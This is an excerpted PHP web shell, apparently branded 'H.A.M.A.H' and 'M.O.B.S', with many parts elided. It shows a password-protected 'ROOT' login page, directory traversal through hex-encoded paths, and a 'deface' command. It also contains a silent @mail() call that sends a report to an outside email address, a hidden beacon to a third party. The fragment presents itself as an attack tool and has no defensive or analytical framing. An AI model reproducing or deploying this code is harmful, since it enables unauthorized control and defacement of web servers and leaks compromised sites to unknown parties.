...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "h/\m/\h"; //Change Password
	if (isset($_POST['pass'])) {
	...
	<html>
	<head>
	<title>-=[ H.A.M.A.H ]=-</title>
	<link rel='icon' href='https://user-images.githubusercontent.com/25004320/228351428-f88b20d5-9866-4cfb-9e64-44b064246fc5.gif'>
	<meta name="theme color" content="#00BFFF">
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
	</head>
	<style>
    body {
        background-image: url("https://g.top4top.io/p_3429adk5o0.jpg");
	...
	<form method="post">
			...
			<input type="submit" name="loginin" value="ROOT">
		</form>
	</body>
	</html>
	<?php
	...
	<head>
		<title>M.O.B.S</title>
		<meta charset='UTF-8'>
		<meta name='author' content='M.O.B.S'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>M.O.B.S</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
		...
		@mail('dompet.presiden@telegmail.com', 'kuntul', $report_bug);
		}
		if($_7['id'] == 'deface'){
...
Allow from all
		...
		</div><div class='text-secondary'>&copy M.O.B.S</div>
	</div>
</div>
</body>
</html>